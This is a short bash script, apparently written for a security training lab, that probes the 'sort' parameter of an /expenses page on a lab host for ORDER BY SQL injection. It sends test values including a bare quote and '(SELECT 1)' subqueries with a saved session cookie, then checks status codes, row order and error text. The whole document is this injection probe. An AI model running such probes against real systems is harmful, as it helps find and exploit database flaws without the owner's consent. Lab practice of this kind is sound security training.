#!/bin/bash
A="http://xebec.cylabacademy.net:17222"
t() {
  printf "%-45s -> " "$1"
  curl -s -m 20 -b /tmp/j752.txt -o /tmp/t.txt -w "%{http_code} " --get --data-urlencode "sort=$1" "$A/expenses"
  grep -oE "<td>(AAA|BBB)</td>" /tmp/t.txt | head -1 | tr -d '\n'
  grep -qiE "500|error" /tmp/t.txt && echo -n " [ERR]"
  echo
}
t "amount"
t "amount DESC"
t "amount asc"
t "-amount"
t "1"
t "'"
t "amount, (SELECT 1)"
t "(SELECT 1)"
